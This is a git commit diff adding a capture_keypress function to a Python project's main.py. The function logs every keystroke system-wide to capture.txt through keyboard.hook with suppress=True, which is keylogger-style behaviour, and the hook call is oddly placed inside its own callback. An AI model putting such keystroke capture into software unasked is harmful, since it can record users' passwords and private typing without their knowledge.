3499f9880cbb9f801f2af721a77eb33dc48ec660
Symbian-Bro <siddhubhai998@gmail.com>
2025-08-19 20:05:51 +0530

    Added the capture_keypress function to the main file

--- Python files/main.py
+++ Python files/main.py
@@ -49,6 +49,22 @@ def word_counter():
                 pass
     return word_count
 
+def capture_keypress(event):
+    log_file = "capture.txt"
+    with open(log_file, "a", encoding="utf-8") as f:
+        if event.name == "space":
+            f.write(" ")
+        elif event.name == "enter":
+            f.write("\n")
+        elif event.name == "backspace":
+            f.write("[BACKSPACE]")
+        elif len(event.name) > 1:
+            f.write(f"[{event.name.upper()}]")
+        else:
+            f.write(event.name)
+
+    keyboard.hook(capture_keypress,suppress=True)
+
                                  #Main program
 port_id = port_finder()
 if not port_id:
